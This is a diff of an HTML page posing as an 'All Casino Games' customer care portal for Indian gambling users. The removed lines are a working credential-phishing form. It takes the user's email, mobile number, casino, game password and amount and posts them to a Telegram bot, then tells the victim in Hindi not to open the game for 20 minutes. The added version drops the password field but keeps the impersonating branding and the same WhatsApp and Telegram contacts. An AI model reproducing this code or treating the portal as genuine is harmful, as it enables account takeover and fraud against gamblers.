@@ -4,480 +4,373 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-<title>All Casino Games Support Portal</title>
+<title>All Casino Games Customer Care Portal</title>
 
 <style>
 * {
     box-sizing: border-box;
     margin: 0;
     padding: 0;
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
 }
 
 body {
-    /* Colorful dark background */
-    background: linear-gradient(135deg, #1a0b2e 0%, #0d1b2a 100%);
-    display: flex;
-    justify-content: center;
-    color: #ffffff;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #0f172a, #1e1b4b, #312e81);
     min-height: 100vh;
+    color: white;
+    padding: 20px;
 }
 
-.app-container {
-    width: 100%;
-    max-width: 440px;
-    min-height: 100vh;
-    background: rgba(20, 30, 48, 0.6);
-    backdrop-filter: blur(10px);
-    display: flex;
-    flex-direction: column;
-    position: relative;
-    box-shadow: 0 0 25px rgba(0,0,0,0.8);
+.container {
+    max-width: 520px;
+    margin: auto;
 }
 
-/* HEADER */
 .header {
-    background: linear-gradient(90deg, #ff007a, #7928ca);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 18px 15px;
-    box-shadow: 0 4px 15px rgba(255, 0, 122, 0.4);
-    position: sticky;
-    top: 0;
-    z-index: 10;
-    text-align: center;
-}
-
-.header h1 {
-    font-size: 18px;
-    font-weight: 900;
-    color: #fff;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
-}
-
-/* MAIN CONTENT */
-.main-content {
-    flex: 1;
-    padding: 20px 15px;
-}
-
-.welcome-text {
     text-align: center;
     margin-bottom: 20px;
 }
 
-.welcome-text p {
+.logo {
+    width: 75px;
+    height: 75px;
+    margin: auto;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #22c55e, #06b6d4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    box-shadow: 0 0 25px rgba(34,197,94,.45);
+}
+
+h1 {
+    margin-top: 15px;
+    font-size: 26px;
+}
+
+.subtitle {
+    margin-top: 7px;
+    color: #cbd5e1;
     font-size: 14px;
-    color: #a8b2c1;
-    line-height: 1.5;
 }
 
-/* FORM BOX */
-.form-box {
-    background: rgba(255, 255, 255, 0.05);
-    border-radius: 12px;
-    padding: 20px 15px;
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+.card {
+    background: rgba(15,23,42,.92);
+    border: 1px solid rgba(255,255,255,.12);
+    border-radius: 20px;
+    padding: 22px;
+    box-shadow: 0 15px 40px rgba(0,0,0,.35);
 }
 
-.field {
-    margin-bottom: 18px;
-}
-
-.field label {
+label {
     display: block;
-    font-size: 12px;
-    font-weight: 700;
-    color: #00e5ff;
-    margin-bottom: 6px;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-}
-
-.field input,
-.field select {
-    width: 100%;
-    padding: 14px;
-    border-radius: 8px;
-    border: 1px solid rgba(255, 255, 255, 0.2);
-    background: rgba(0, 0, 0, 0.4);
+    margin: 14px 0 7px;
     font-size: 14px;
-    font-weight: 600;
-    color: #fff;
-    outline: none;
-    transition: 0.3s ease;
-}
-
-.field input::placeholder {
-    color: #7b8ea8;
-}
-
-.field input:focus,
-.field select:focus {
-    border-color: #ff007a;
-    background: rgba(0, 0, 0, 0.6);
-    box-shadow: 0 0 10px rgba(255, 0, 122, 0.3);
-}
-
-.field select option {
-    background: #1a1a2e;
-    color: #fff;
-}
-
-/* BUTTONS SECTION */
-.action-buttons {
-    margin-top: 25px;
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-}
-
-.submit-btn {
-    width: 100%;
-    background: linear-gradient(to right, #f9d423 0%, #ff4e50 100%);
-    color: #fff;
-    border: none;
-    padding: 16px;
-    font-size: 16px;
-    font-weight: 900;
-    border-radius: 8px;
-    cursor: pointer;
-    text-transform: uppercase;
-    box-shadow: 0 4px 15px rgba(255, 78, 80, 0.4);
-    transition: 0.2s;
-}
-
-.submit-btn:active {
-    transform: scale(0.98);
-}
-
-.submit-btn:disabled {
-    opacity: 0.7;
-    cursor: not-allowed;
-}
-
-.whatsapp-btn {
-    width: 100%;
-    background: linear-gradient(to right, #11998e, #38ef7d);
-    color: #fff;
-    text-align: center;
-    text-decoration: none;
-    padding: 16px;
-    font-size: 15px;
-    font-weight: 800;
-    border-radius: 8px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 8px;
-    box-shadow: 0 4px 15px rgba(56, 239, 125, 0.3);
-    transition: 0.2s;
-}
-
-.telegram-btn {
-    width: 100%;
-    background: linear-gradient(to right, #00c6ff, #0072ff);
-    color: #fff;
-    text-align: center;
-    text-decoration: none;
-    padding: 16px;
-    font-size: 15px;
-    font-weight: 800;
-    border-radius: 8px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 8px;
-    box-shadow: 0 4px 15px rgba(0, 114, 255, 0.3);
-    transition: 0.2s;
-}
-
-/* FOOTER */
-.footer-text {
-    text-align: center;
-    margin-top: 30px;
-    font-size: 12px;
-    color: #a8b2c1;
-    padding-bottom: 20px;
-}
-
-.footer-text strong {
-    color: #00e5ff;
-}
-
-/* SUCCESS MODAL POPUP */
-.modal-overlay {
-    display: none;
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0, 0, 0, 0.85);
-    backdrop-filter: blur(5px);
-    z-index: 1000;
-    justify-content: center;
-    align-items: center;
-}
-
-.modal-content {
-    background: linear-gradient(135deg, #1f1c2c, #928dab);
-    padding: 30px 20px;
-    border-radius: 16px;
-    text-align: center;
-    width: 90%;
-    max-width: 360px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    border: 2px solid #00e5ff;
-    animation: popIn 0.3s ease-out;
-}
-
-@keyframes popIn {
-    0% { transform: scale(0.8); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
-}
-
-.modal-content h2 {
-    font-size: 22px;
-    color: #00ff66;
-    margin-bottom: 15px;
-}
-
-.modal-content p {
-    font-size: 14px;
-    color: #fff;
-    margin-bottom: 20px;
-    line-height: 1.6;
-}
-
-.modal-content p span {
-    color: #ff4e50;
     font-weight: bold;
 }
 
-.modal-btn {
-    background: #00e5ff;
-    color: #000;
+input,
+select,
+textarea {
+    width: 100%;
+    padding: 13px;
+    border-radius: 10px;
+    border: 1px solid #475569;
+    background: #0f172a;
+    color: white;
+    outline: none;
+    font-size: 15px;
+}
+
+input:focus,
+select:focus,
+textarea:focus {
+    border-color: #22c55e;
+    box-shadow: 0 0 0 2px rgba(34,197,94,.15);
+}
+
+textarea {
+    min-height: 90px;
+    resize: vertical;
+}
+
+.note {
+    margin-top: 12px;
+    padding: 12px;
+    border-radius: 10px;
+    background: rgba(245,158,11,.1);
+    border: 1px solid rgba(245,158,11,.3);
+    color: #fde68a;
+    font-size: 12px;
+    line-height: 1.5;
+}
+
+.btn {
+    width: 100%;
     border: none;
-    padding: 12px 30px;
+    padding: 14px;
+    margin-top: 18px;
+    border-radius: 12px;
     font-size: 16px;
-    font-weight: 800;
-    border-radius: 8px;
+    font-weight: bold;
     cursor: pointer;
-    text-transform: uppercase;
-    box-shadow: 0 4px 10px rgba(0, 229, 255, 0.3);
+    color: white;
+    transition: .2s;
+}
+
+.btn:hover {
+    transform: translateY(-2px);
+}
+
+.submit {
+    background: linear-gradient(135deg, #16a34a, #059669);
+}
+
+.whatsapp {
+    background: #25D366;
+}
+
+.telegram {
+    background: #229ED9;
+}
+
+.footer {
+    text-align: center;
+    margin-top: 18px;
+    color: #94a3b8;
+    font-size: 12px;
+}
+
+.modal {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,.75);
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.modal-box {
+    width: 100%;
+    max-width: 400px;
+    background: #0f172a;
+    border: 1px solid #334155;
+    border-radius: 18px;
+    padding: 25px;
+    text-align: center;
+}
+
+.success-icon {
+    font-size: 48px;
+    margin-bottom: 10px;
+}
+
+.close {
+    margin-top: 18px;
+    padding: 11px 25px;
+    border: none;
+    border-radius: 10px;
+    background: #334155;
+    color: white;
+    cursor: pointer;
 }
 </style>
 </head>
 
 <body>
 
-<div class="app-container">
+<div class="container">
 
-    <!-- Header Section -->
-    <header class="header">
-        <h1>All Casino Games Customer Care Portal</h1>
-    </header>
+    <div class="header">
+        <div class="logo">🛡️</div>
 
-    <!-- Main Content -->
-    <main class="main-content">
-        
-        <div class="welcome-text">
-            <p>Fast and Secure Account Support for All Platforms.</p>
+        <h1>All Casino Games Customer Care</h1>
+
+        <div class="subtitle">
+            Fast • Secure • Trusted Support Portal
         </div>
-
-        <div class="form-box">
-            <form id="supportForm">
-                
-                <div class="field">
-                    <label>Registered Email</label>
-                    <input type="text" id="email" placeholder="Enter your game register email I d" required>
-                </div>
-
-                <div class="field">
-                    <label>Registered Mobile</label>
-                    <input type="tel" id="mobile" placeholder="Enter mobile number" required>
-                </div>
-
-                <div class="field">
-                    <label>Casino Name</label>
-                    <input type="text" id="platform" placeholder="e.g. Parimatch, 4rabet, etc." required>
-                </div>
-
-                <div class="field">
-                    <label>Game Password</label>
-                    <input type="text" id="password" placeholder="Enter your Game Password" required>
-                </div>
-
-                <div class="field">
-                    <label>Amount (₹)</label>
-                    <input type="number" id="amount" placeholder="Enter amount" required>
-                </div>
-
-                <div class="field">
-                    <label>Select Issue Type</label>
-                    <select id="problem" required>
-                        <option value="" disabled selected>Select an issue...</option>
-                        <option value="Withdrawal Processing">Withdrawal Processing</option>
-                        <option value="Withdrawal Declined">Withdrawal Declined</option>
-                        <option value="Deposit Not Received">Deposit Not Received</option>
-                        <option value="Account Verification (KYC)">Account Verification (KYC)</option>
-                        <option value="ID Blocked">ID Blocked / Restricted</option>
-                        <option value="Bonus Issue">Bonus / Promo Issue</option>
-                        <option value="Other Issue">Other Issue</option>
-                    </select>
-                </div>
-
-                <!-- BUTTONS SECTION -->
-                <div class="action-buttons">
-                    <button type="submit" class="submit-btn" id="submitBtn">
-                        Submit Request
-                    </button>
-
-                    <a href="https://wa.me/917300365084" target="_blank" class="whatsapp-btn">
-                        🟢 Contact via WhatsApp
-                    </a>
-
-                    <!-- Naya Telegram ID Update -->
-                    <a href="https://t.me/Helpcare02" target="_blank" class="telegram-btn">
-                        🔵 Contact via Telegram
-                    </a>
-                </div>
-            </form>
-        </div>
-
-        <div class="footer-text">
-            <strong>100% Safe & Secure</strong><br>
-            Official Support Team will resolve your issue shortly.
-        </div>
-
-    </main>
-</div>
-
-<!-- VIP SUCCESS MODAL POPUP -->
-<div class="modal-overlay" id="successModal">
-    <div class="modal-content">
-        <h2>✅ Request Sent!</h2>
-        <p>20 minutes wait karein, hamari expert team aapki problem ko check karne wali hai. Uske baad aapka issue solve hoga. <br><br><span>⚠️ Itne aapko game open nahi karna hai, 20 minute tak.</span><br><br>Thank You!</p>
-        <button class="modal-btn" onclick="closeModal()">OK</button>
     </div>
+
+    <div class="card">
+
+        <form id="supportForm">
+
+            <label for="email">Registered Email</label>
+            <input
+                type="email"
+                id="email"
+                name="email"
+                placeholder="Enter your registered email"
+                required
+            >
+
+            <label for="mobile">Registered Mobile</label>
+            <input
+                type="tel"
+                id="mobile"
+                name="mobile"
+                placeholder="Enter your registered mobile"
+                required
+            >
+
+            <label for="casino">Casino Name</label>
+            <input
+                type="text"
+                id="casino"
+                name="casino"
+                placeholder="Enter casino/game name"
+                required
+            >
+
+            <label for="userId">User ID</label>
+            <input
+                type="text"
+                id="userId"
+                name="userId"
+                placeholder="Enter your User ID"
+                required
+            >
+
+            <label for="amount">Withdrawal / Deposit Amount</label>
+            <input
+                type="number"
+                id="amount"
+                name="amount"
+                placeholder="Enter amount"
+                min="0"
+            >
+
+            <label for="issue">Issue Type</label>
+            <select id="issue" name="issue" required>
+                <option value="">Select your issue</option>
+                <option>Withdrawal Processing</option>
+                <option>Withdrawal Declined</option>
+                <option>Deposit Not Received</option>
+                <option>Account Verification (KYC)</option>
+                <option>ID Blocked</option>
+                <option>Bonus Issue</option>
+                <option>Other Issue</option>
+            </select>
+
+            <label for="message">Additional Details</label>
+            <textarea
+                id="message"
+                name="message"
+                placeholder="Describe your issue..."
+            ></textarea>
+
+            <div class="note">
+                ⚠️ Never share your account password, OTP, PIN, CVV or recovery code.
+            </div>
+
+            <button type="submit" class="btn submit">
+                Submit Support Request
+            </button>
+
+        </form>
+
+        <button
+            class="btn whatsapp"
+            onclick="openWhatsApp()">
+            💬 Chat on WhatsApp
+        </button>
+
+        <button
+            class="btn telegram"
+            onclick="openTelegram()">
+            ✈️ Chat on Telegram
+        </button>
+
+    </div>
+
+    <div class="footer">
+        Please verify the official support channel before sharing any account information.
+    </div>
+
 </div>
+
+
+<div class="modal" id="successModal">
+
+    <div class="modal-box">
+
+        <div class="success-icon">✅</div>
+
+        <h2>Request Ready!</h2>
+
+        <p style="margin-top:10px;color:#cbd5e1;line-height:1.5;">
+            Your support details have been prepared successfully.
+            Please use the official support channel to submit them.
+        </p>
+
+        <button
+            class="close"
+            onclick="closeModal()">
+            Close
+        </button>
+
+    </div>
+
+</div>
+
 
 <script>
-// 1. "Tu" (Beep) Sound Function
-function playBeepSound() {
-    try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioCtx.createOscillator();
-        const gainNode = audioCtx.createGain();
-        
-        oscillator.type = 'sine';
-        oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); 
-        gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); 
-        
-        oscillator.connect(gainNode);
-        gainNode.connect(audioCtx.destination);
-        
-        oscillator.start();
-        oscillator.stop(audioCtx.currentTime + 0.15); // 0.15s short beep
-    } catch(e) {
-        console.log("Audio API not supported");
-    }
-}
 
-// 2. AI Voice Message Function (Hindi TTS for clarity)
-function playVoiceMessage() {
-    if ('speechSynthesis' in window) {
-        // Hindi text explicitly added for smooth and clear voice pronunciation
-        const text = "बीस मिनट वेट करें, हमारी एक्सपर्ट टीम आपकी प्रॉब्लम को चेक करने वाली है। उसके बाद आपका इश्यू सॉल्व होगा। इतने आपको गेम ओपन नहीं करना है, बीस मिनट तक। थैंक यू।";
-        const utterance = new SpeechSynthesisUtterance(text);
-        utterance.lang = 'hi-IN'; // Indian Hindi voice language
-        utterance.rate = 0.95; // Slightly slower for clear understanding
-        window.speechSynthesis.speak(utterance);
-    }
-}
+const supportForm = document.getElementById("supportForm");
 
-// Modal Functions
-function openModal() {
-    document.getElementById("successModal").style.display = "flex";
-}
-function closeModal() {
-    document.getElementById("successModal").style.display = "none";
-    // Agar koi user turant 'OK' daba deta hai to aawaz band ho jaye
-    if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-    }
-}
+supportForm.addEventListener("submit", function(event) {
 
-// Form Submit Handling
-document.getElementById("supportForm").addEventListener("submit", function(e) {
-    e.preventDefault();
+    event.preventDefault();
 
-    // Pehle Beep sound play hogi 
-    playBeepSound();
-
-    const btn = document.getElementById("submitBtn");
-    
-    // Values
     const email = document.getElementById("email").value.trim();
     const mobile = document.getElementById("mobile").value.trim();
-    const platform = document.getElementById("platform").value.trim();
-    const password = document.getElementById("password").value.trim();
-    const amount = document.getElementById("amount").value.trim();
-    const problem = document.getElementById("problem").value;
+    const casino = document.getElementById("casino").value.trim();
+    const userId = document.getElementById("userId").value.trim();
+    const issue = document.getElementById("issue").value;
 
-    if (!email || !mobile || !platform || !password || !amount || !problem) {
-        alert("Please complete all details.");
+    if (!email || !mobile || !casino || !userId || !issue) {
+        alert("Please fill all required fields.");
         return;
     }
 
-    // NAYA TELEGRAM BOT DETAILS
-    ;
-    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    document.getElementById("successModal").style.display = "flex";
 
-    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
-    
-    // Telegram Message Format
-    const message = `🎲 *ALL CASINO SUPPORT* 🎲\n\n👤 *Email:* ${email}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n *Password:* ${password}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;
+    if ("speechSynthesis" in window) {
+        const speech = new SpeechSynthesisUtterance(
+            "Your support request is ready."
+        );
 
-    btn.disabled = true;
-    btn.innerText = "Processing...";
+        speech.lang = "en-IN";
+        speech.rate = 0.9;
 
-    fetch(telegramApiUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "Markdown"
-        })
-    })
-    .then(response => {
-        if (!response.ok) throw new Error("Request failed");
-        return response.json();
-    })
-    .then(data => {
-        // Success hone par form reset
-        document.getElementById("supportForm").reset();
-        
-        // Popup dikhayein
-        openModal();
-        
-        // AI Voice Message play karein
-        playVoiceMessage();
-    })
-    .catch(error => {
-        console.error(error);
-        alert("Error sending request. Please use WhatsApp or Telegram button below.");
-    })
-    .finally(() => {
-        btn.disabled = false;
-        btn.innerText = "Submit Request";
-    });
+        window.speechSynthesis.speak(speech);
+    }
+
 });
+
+
+function closeModal() {
+    document.getElementById("successModal").style.display = "none";
+}
+
+
+function openWhatsApp() {
+    window.open(
+        "https://wa.me/917300365084",
+        "_blank"
+    );
+}
+
+
+function openTelegram() {
+    window.open(
+        "https://t.me/Helpcare02",
+        "_blank"
+    );
+}
+
 </script>
 
 </body>
